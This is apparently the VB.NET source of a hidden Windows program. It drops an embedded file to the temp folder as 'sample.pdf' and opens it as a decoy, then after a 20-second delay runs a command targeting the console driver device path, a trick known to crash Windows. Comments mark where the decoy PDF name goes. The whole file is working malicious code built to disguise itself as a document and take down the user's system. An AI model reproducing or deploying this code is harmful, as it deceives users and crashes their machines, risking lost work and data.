Imports System.IO


Public Class Form1
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Hide()
        Me.Opacity = 0
        Me.ShowInTaskbar = False

        Dim Ressourcl() As Byte = My.Resources.sample



        FileOpen(1, Environ("tmp") & "\sample.pdf", OpenMode.Binary) 'here insert PDF file name
        FilePut(1, Ressourcl)
        FileClose(1)
        Dim file As String = Environ("tmp") & "\sample.pdf" 'here insert PDF file name
        Dim process As Process = Process.Start(file)

        System.Threading.Thread.Sleep(20000)

        Dim command = "\\.\globalroot\device\condrv\kernelconnect"
        Shell(command)




    End Sub


End Class